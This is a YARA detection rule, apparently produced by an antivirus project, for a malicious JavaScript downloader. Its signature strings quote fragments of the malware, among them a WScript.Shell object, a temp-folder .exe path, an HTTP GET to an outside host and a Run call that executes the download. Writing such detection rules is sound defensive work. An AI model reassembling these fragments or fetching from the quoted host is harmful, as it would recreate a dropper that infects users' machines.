rule sig_20160328_efb55c0c0f91d62abe4ec111b66e931c {
  meta:
    description = "datamaliciousorder - file 20160328_efb55c0c0f91d62abe4ec111b66e931c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "87316ad48f7af3e94b7ff8e60e9e5fd029a4fd68106c7a6f5a9e0df44d3f401e"

  strings:
    $s1  = "function Ieiyzvqhd() {return Uwuum[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"R6qu3ZZJOI2tP5e.exe\";};" fullword ascii
    $s2  = "Xeuabb[Zjopas](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Yeomydsza](Urjdxkqhs() * 11)} while (Xeuabb[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Uwuum = function Akwwr() {return WScript[Xvlrdcq](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Byqgmz(Kaqvmdohrm, Dmyllp){return Kaqvmdohrm - Dmyllp;};" fullword ascii
    $s6  = "function Btlifkdc(Sdyzpy){Uwuum[\"Run\"](Sdyzpy, Iwcgla, Iwcgla);};" fullword ascii
    $s7  = "function Hzbev() {return ((Pltvl == true) && (Pltvl == Kveeqs)) ? 1 : Iwcgla;};" fullword ascii
    $s8  = "function Laykqijlw(Fgrrnadn) {var Ggaptji = (1, 2, 3, 4, 5, Fgrrnadn); return Ggaptji;};" fullword ascii
    $s9  = "function Stxypdbzsf()" fullword ascii
    $s10 = "var Ndvccs = new this[\"Date\"]();" fullword ascii
    $s11 = "Pltvl = true; " fullword ascii
    $s12 = "var Pltvl = false;" fullword ascii
    $s13 = "var Kveeqs = false;" fullword ascii
    $s14 = "function Ehwzzylpn(){return Nqcljiq;};" fullword ascii
    $s15 = "function Urjdxkqhs(){return 22;};" fullword ascii
    $s16 = "return Byqgmz(Qotxtfegyz, Kkecck);" fullword ascii
    $s17 = " while (Mgvxlafir){" fullword ascii
    $s18 = "function Qylaauw(){return Xvlrdcq;};" fullword ascii
    $s19 = "var Yiidbgv = false;" fullword ascii
    $s20 = "Kveeqs = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}